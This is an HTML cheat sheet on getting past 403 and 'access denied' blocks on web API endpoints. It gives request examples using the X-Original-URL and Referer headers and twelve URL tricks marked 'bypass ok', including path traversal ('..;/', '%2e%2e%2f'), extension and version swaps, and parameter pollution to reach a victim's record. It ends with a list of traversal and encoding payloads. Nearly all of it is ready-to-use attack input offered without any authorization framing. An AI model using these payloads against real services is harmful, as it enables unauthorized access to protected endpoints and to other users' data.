<h3>If you want do bypass endpoint always try to use own methodology.<h3>

<b>Example</b>:

Http Header based bypass:

<b>1.</b> X-Original-URL: /redact

<b>Example:</b><br/>
 
GET /api/getUser HTTP/1.1 → 403
Host: redact.com

GET / HTTP/1.1
Host: redact.com
X-Original-URL: /api/getUser → 200 OK

<b>2.</b> Referer: https://site.com/api/redact

Example:<br/>
  

GET /api/getUser HTTP/1.1 → acess denied
Host: redact.com

  
  
GET / HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser → 200 OK
 
  or
  
GET / HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser → 200 ok

More examples:

<b>3</b>. https://site.com/api/v1/users/redactid → access denied <br/>
https://site.com/api/v1/users/redactid<b>.json</b> → bypass ok <br/>

<b>4</b>. https://site.com/api/v1/redactid → acess denied <br/>
https://site.com/api/v1/users/redactid<b>:</b> → bypass ok <br/>

<b>5</b>. https://site.com/api/v1/users/redactid → access denied <br/>
https://site.com/api/v1/users/redactid<b>..;/</b> → bypass ok <br/>

<b>6</b>. https://site.com/api/v1/users/redactid → access denied <br/>
https://site.com/api/v1/users/redactid<b>\..\.\getUser</b> → bypass ok <br/>

<b>7</b>. https://site.com/api/v1/users/redactid → access denied <br/>
https://site.com/api/v1/users/redactid<b>/</b> → bypass ok <br/>

<b>8</b>. https://site.com/api/v1/users/redactid → acess denied <br/>
https://site.com/api/v1/users/redactid<b>??</b> → bypass ok <br/>

<b>9</b>. https://site.com/api/v1/users/redactid → access denied <br/>
https://site.com/api/<b>v2</b>/users/redactid → bypass ok <br/>
            or
https://site.com/api/<b>v3</b>/users/redactid → bypass ok <br/>

<b>10</b>. https://site.com/api/v1/users/redactid → access denied <br/>
https://site.com/api/v1/users/redactid<b>&accountdetails</b> → bypass ok <br/>

<b>11</b>. https://site.com/api/v1/users/victim?id=BAEILsaqQhk → acess denied <br/>
https://site.com/api/v1/users/<b>your?id=UAEILsdUf50&</b>victim?id=BAEILsaqQhk → bypass ok <br/>

<b>12</b>. https://site.com/api/v1/users/redactid → access denied <br/>
https://site.com/api/v1/users/redactid<b>/email</b> → bypass ok <br/>

Payload for basic test:
<ul>
 <b>
? <br/>
?? <br/>
& <br/>
'#' <br/>
% <br/>
%20 <br/>
%09 <br/>
/ <br/>
/..;/ <br/>
../ <br/>
..$2f <br/>
..;/ <br/>
../ <br/>
\..\.\ <br/>
.././ <br/>
..%00/ <br/>
.%0d/ <br/>
..%5c <br/>
..\ <br/>
..%ff/ <br/>
%2e%2e%2f <br/>
.%2e/ <br/>
%3f <br/>
%26 <br/>
%23 <br/>
.json <br/>
 </b>
</ul>
HTTP Header based bypass:

1. X-Original-URL: /redact
2. Referer: https://site.com/api/redact



